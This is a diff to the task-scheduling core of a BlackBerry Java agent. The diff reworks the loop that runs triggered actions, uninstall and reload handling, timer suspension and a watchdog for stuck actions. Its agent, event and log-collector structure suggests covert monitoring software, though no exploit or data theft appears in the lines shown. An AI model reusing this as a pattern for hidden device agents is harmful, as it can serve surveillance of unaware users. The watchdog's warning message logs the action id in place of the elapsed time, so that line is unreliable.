@@ -9,9 +9,11 @@
 
 package blackberry;
 
+import java.util.Date;
 import java.util.Timer;
 import java.util.Vector;
 
+import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import blackberry.action.Action;
 import blackberry.action.SubAction;
@@ -91,6 +93,10 @@ public final class Task implements Singleton {
         //#endif
     }
 
+    Date lastActionCheckedStart;
+    Date lastActionCheckedEnd;
+    int lastActionCheckedId;
+
     /**
      * Check actions.
      * 
@@ -99,98 +105,97 @@ public final class Task implements Singleton {
     public boolean checkActions() {
         Utils.sleep(1000);
 
-        try{
-        for (;;) {
+        try {
+            for (;;) {
 
-            /*
-             * if(Backlight.isEnabled()){
-             * notifyBacklight(true);
-             * }else{
-             * notifyBacklight(false);
-             * }
-             */
+                lastActionCheckedStart = new Date();
 
-            //#ifdef DEBUG_TRACE
-            // debug.trace("checkActions");
-            //#endif
-            final int[] actionIds = status.getActionIdTriggered();
+                //#ifdef DEBUG_TRACE
+                // debug.trace("checkActions");
+                //#endif
+                final int[] actionIds = status.getActionIdTriggered();
 
-            final int asize = actionIds.length;
-            if (asize > 0) {
+                final int asize = actionIds.length;
+                if (asize > 0) {
 
-                for (int k = 0; k < asize; ++k) {
-                    final int actionId = actionIds[k];
-                    final Action action = status.getAction(actionId);
+                    for (int k = 0; k < asize; ++k) {
+                        final int actionId = actionIds[k];
 
-                    if (action.isTriggered() == false) {
-                        //#ifdef DEBUG
-                        debug.warn("Should be triggered: " + action);
-                        //#endif
-                        continue;
-                    }
+                        lastActionCheckedId = actionId;
 
-                    //#ifdef DEBUG_TRACE
-                    debug.trace("CheckActions() triggered: " + action);
+                        final Action action = status.getAction(actionId);
 
-                    //#endif
-                    action.setTriggered(false, null);
-
-                    final Vector subActions = action.getSubActionsList();
-
-                    final int ssize = subActions.size();
-
-                    for (int j = 0; j < ssize; ++j) {
-
-                        try {
-                            final SubAction subAction = (SubAction) subActions
-                                    .elementAt(j);
-                            //#ifdef DBC
-                            Check.asserts(subAction != null,
-                                    "checkActions: subAction!=null");
-                            //#endift
-
-                            final boolean ret = subAction.execute(action
-                                    .getTriggeringEvent());
-
-                            if (subAction.wantUninstall()) {
-                                //#ifdef DEBUG
-                                debug.warn("CheckActions() uninstalling");
-                                //#endif
-                                agentManager.stopAll();
-                                eventManager.stopAll();
-                                status.unTriggerAll();
-                                return false;
-                            }
-
-                            if (subAction.wantReload()) {
-                                //#ifdef DEBUG
-                                debug.warn("CheckActions() reloading");
-                                //#endif
-                                agentManager.stopAll();
-                                eventManager.stopAll();
-                                Utils.sleep(2000);
-                                status.unTriggerAll();
-                                return true;
-                            }
-                            
-                            if (ret == false) {
-                                //#ifdef DEBUG
-                                debug.warn("CheckActions() error executing: "
-                                        + subAction);
-                                //#endif
-                                continue;
-                            }
-                        } catch (final Exception ex) {
-                            //#ifdef DEBUG_ERROR
-                            debug.error("checkActions for: " + ex);
+                        if (action.isTriggered() == false) {
+                            //#ifdef DEBUG
+                            debug.warn("Should be triggered: " + action);
                             //#endif
+                            continue;
+                        }
+
+                        //#ifdef DEBUG_TRACE
+                        debug.trace("CheckActions() triggered: " + action);
+                        //#endif
+                        action.setTriggered(false, null);
+
+                        final Vector subActions = action.getSubActionsList();
+                        final int ssize = subActions.size();
+
+                        for (int j = 0; j < ssize; ++j) {
+
+                            try {
+                                final SubAction subAction = (SubAction) subActions
+                                        .elementAt(j);
+                                //#ifdef DBC
+                                Check.asserts(subAction != null,
+                                        "checkActions: subAction!=null");
+                                //#endift
+
+                                final boolean ret = subAction.execute(action
+                                        .getTriggeringEvent());
+
+                                if (subAction.wantUninstall()) {
+                                    //#ifdef DEBUG
+                                    debug.warn("CheckActions() uninstalling");
+                                    //#endif
+                                    agentManager.stopAll();
+                                    eventManager.stopAll();
+                                    status.unTriggerAll();
+                                    return false;
+                                }
+
+                                if (subAction.wantReload()) {
+                                    //#ifdef DEBUG
+                                    debug.warn("CheckActions() reloading");
+                                    //#endif
+                                    status.unTriggerAll();
+                                    agentManager.stopAll();
+                                    eventManager.stopAll();
+                                    Utils.sleep(2000);
+                                    status.unTriggerAll();
+                                    return true;
+                                }
+
+                                if (ret == false) {
+                                    //#ifdef DEBUG
+                                    debug
+                                            .warn("CheckActions() error executing: "
+                                                    + subAction);
+                                    //#endif
+                                    continue;
+                                }
+                            } catch (final Exception ex) {
+                                //#ifdef DEBUG_ERROR
+                                debug.error("checkActions for: " + ex);
+                                //#endif
+                            }
                         }
                     }
                 }
+                lastActionCheckedEnd = new Date();
+
+                Utils.sleep(SLEEPING_TIME);
             }
-            Utils.sleep(SLEEPING_TIME);
-        }
-        }catch(Exception ex){
+        } catch (Exception ex) {
             //#ifdef DEBUG_FATAL
             debug.fatal("checkActions error, restart: " + ex);
             //#endif
@@ -212,8 +217,8 @@ public final class Task implements Singleton {
      * Start application timer.
      */
     synchronized void startApplicationTimer() {
-        //#ifdef DEBUG_TRACE
-        debug.trace("startApplicationTimer");
+        //#ifdef DEBUG_INFO
+        debug.info("startApplicationTimer");
         //#endif
 
         if (applicationTimer != null) {
@@ -232,14 +237,98 @@ public final class Task implements Singleton {
      * Stop application timer.
      */
     synchronized void stopApplicationTimer() {
-        //#ifdef DEBUG_TRACE
-        debug.trace("stopApplicationTimer");
+        //#ifdef DEBUG_INFO
+        debug.info("stopApplicationTimer");
         //#endif
         if (applicationTimer != null) {
             applicationTimer.cancel();
             applicationTimer = null;
             appUpdateManager = null;
         }
+    }
+
+    /**
+     * Start application timer.
+     */
+    synchronized void resumeApplicationTimer() {
+        //#ifdef DEBUG_INFO
+        debug.info("resumeApplicationTimer");
+        //#endif
+
+        if (applicationTimer != null) {
+            applicationTimer.cancel();
+            applicationTimer = null;
+        }
+        applicationTimer = new Timer();
+
+        if (appUpdateManager == null) {
+            appUpdateManager = new AppUpdateManager();
+        } else {
+            appUpdateManager = new AppUpdateManager(appUpdateManager);
+        }
+
+        applicationTimer.schedule(appUpdateManager, APP_TIMER_PERIOD,
+                APP_TIMER_PERIOD);
+
+    }
+
+    /**
+     * Stop application timer.
+     */
+    synchronized void suspendApplicationTimer() {
+        //#ifdef DEBUG_INFO
+        debug.info("suspendApplicationTimer");
+        //#endif
+        if (applicationTimer != null) {
+            applicationTimer.cancel();
+            applicationTimer = null;
+        }
+    }
+
+    /**
+     * Dice se l'application timer e' attivo e funzionante.
+     * Se e'
+     * 
+     * @return true se funziona
+     */
+
+    public synchronized boolean verifyTimers() {
+        boolean ret = true;
+        if (!Backlight.isEnabled()) {
+            return true;
+        }
+
+        if (lastActionCheckedEnd != null && lastActionCheckedStart != null) {
+            long lastActionElapse = lastActionCheckedEnd.getTime()
+                    - lastActionCheckedStart.getTime();
+            if (lastActionElapse > 60 * 1000) {
+                //#ifdef DEBUG_WARN
+                debug.warn("lastAction stuck by: " + lastActionCheckedId
+                        + " elapsed:" + lastActionCheckedId);
+                //#endif
+                ret = false;
+            }
+        }
+
+        if (applicationTimer == null) {
+            //#ifdef DEBUG_WARN
+            debug.warn("applicationTimer == null");
+            //#endif
+            ret = false;
+        }
+
+        if (appUpdateManager == null) {
+            //#ifdef DEBUG_WARN
+            debug.warn("appUpdateManager == null");
+            //#endif
+            ret = false;
+        }
+
+        //#ifdef DEBUG_TRACE
+        debug.trace("verifyTimers: " + ret);
+        //#endif
+
+        return ret;
     }
 
     /**
@@ -270,7 +359,7 @@ public final class Task implements Singleton {
         }
 
         if (logCollector != null) {
-            logCollector.scanLogs();
+            logCollector.initLogs();
         }
 
         // Da qui in poi inizia la concorrenza dei thread
